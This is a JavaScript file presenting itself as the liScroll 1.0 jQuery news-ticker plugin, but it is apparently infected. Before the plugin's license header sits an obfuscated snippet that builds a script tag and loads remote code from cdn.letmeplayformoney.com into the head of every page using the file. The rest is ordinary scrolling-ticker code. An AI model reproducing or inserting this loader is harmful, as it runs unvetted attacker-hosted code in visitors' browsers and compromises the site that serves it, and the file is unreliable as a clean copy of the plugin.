var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);/*!
 * liScroll 1.0
 * Examples and documentation at:
 * http://www.gcmingati.net/wordpress/wp-content/lab/jquery/newsticker/jq-liscroll/scrollanimate.html
 * 2007-2010 Gian Carlo Mingati
 * Version: 1.0.2.1 (22-APRIL-2011)
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 * Requires:
 * jQuery v1.2.x or later
 *
 */


jQuery.fn.liScroll = function(settings) {
	settings = jQuery.extend({
		travelocity: 0.07,
		direction: "left",
		pauseOnMouse: true
	}, settings);
	return this.each(function(){
		var $strip = jQuery(this);
		$strip.addClass("liScroll");

		var stripWidth = 0;
		$strip.find("li").each(function(i){
			stripWidth += jQuery(this, i).outerWidth(true); // thanks to Michael Haszprunar and Fabien Volpi
		});

		var $mask = $strip.wrap("<div class='mask'></div>");
		var $tickercontainer = $strip.parent().wrap("<div class='liScroll-container'></div>");
		var containerWidth = $strip.parent().parent().width();	//a.k.a. 'mask' width
		$strip.width(stripWidth);
		var totalTravel = stripWidth+containerWidth;
		var defTiming = totalTravel/settings.travelocity;	// thanks to Scott Waye
		function scrollnews(spazio, tempo){

			if(settings.direction == "right"){
				if(spazio==stripWidth+containerWidth)
					$strip.css("left", -stripWidth);
				spazio=-spazio-20;
			}

			$strip.animate(
				{left: '-='+ spazio},
				tempo,
				"linear",
				function(){
					$strip.css("left", containerWidth);
					scrollnews(totalTravel, defTiming);
				}
			);
		}
		scrollnews(totalTravel, defTiming);

		if(settings.pauseOnMouse==true)
		{
			$strip.hover(function(){
				jQuery(this).stop();
			},

			function(){
				var offset = jQuery(this).offset();
				var residualSpace = offset.left + stripWidth;
				if(settings.direction == "right"){
					residualSpace = -offset.left+containerWidth+20;
				}

				var residualTime = residualSpace/settings.travelocity;
				scrollnews(residualSpace, residualTime);
			});
		}
	});
};
